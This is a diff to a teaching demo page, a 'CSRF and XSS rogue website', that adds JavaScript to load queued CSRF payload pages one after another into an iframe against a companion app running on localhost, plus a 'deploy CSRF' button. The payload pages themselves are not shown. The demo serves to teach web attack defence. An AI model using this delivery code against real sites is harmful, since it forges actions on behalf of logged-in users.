@@ -11,9 +11,37 @@
     />
     <title>CSRF and XSS rogue website</title>
     <link rel="stylesheet" href="./index.css" />
+    <script>
+      function deployCsrf() {
+        const wrapper = document.querySelector('#csrfWrapper');
+        const iframe = wrapper.querySelector('iframe');
+
+        wrapper.style.display = 'block';
+
+        const payloadQueue = [
+          '/payload_get.html',
+          '/payload_post.html',
+          '/payload_get.html',
+        ];
+        const ALL_DONE_PAYLOAD = '/all_done.html';
+        let payload;
+        iframe.addEventListener('error', (err) => {
+          console.error(`Error while executing payload "${payload}":`, err);
+        });
+        iframe.addEventListener('load', () => {
+          if (payload !== ALL_DONE_PAYLOAD) {
+            setTimeout(() => {
+              iframe.src = payload = payloadQueue.shift() || ALL_DONE_PAYLOAD;
+            }, 100);
+          }
+        });
+        iframe.src = payload = payloadQueue.shift();
+      }
+    </script>
   </head>
   <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
+
     <h1>&#x1f575; CSRF and XSS rogue website</h1>
     <p>
       This website demonstrates CSRF and XSS attacks against the companion
@@ -34,5 +62,37 @@
       assign <code>application.com</code> to <code>localhost</code> on your <code>/etc/hosts</code> file
       and also make sure that you are logged in the target application in order for the attacks to work.
     </p>
+
+    <h2>Are you ready?</h2>
+
+    <a
+      class="attack-button"
+      href="javascript: deployCsrf(); void(0);"
+    >
+      &#x1f982; <!-- Scorpion emoji. -->
+      Yes, deploy CSRF!
+    </a>
+
+    <div id="csrfWrapper">
+      <h3>CSRF deployed</h3>
+      <p>
+        Obviously, a real attack would not show any indication to the user that something bad is happening.
+      </p>
+      <p>
+        The <code>&lt;iframe&gt;</code> below is only being shown for didactic purposes.
+      </p>
+      <iframe width="100%"></iframe>
+      <p>
+        You can check out the results on the Network tab of your browser Console (shortcut is normally
+        <kbd>F12</kbd>) or directly on the
+        <a
+          href="http://application.com:3000/users/list"
+          target="_blank"
+          rel="noopener noreferrer"
+        >List of Users</a>
+        of the target website.
+      </p>
+    </div>
+
   </body>
 </html>
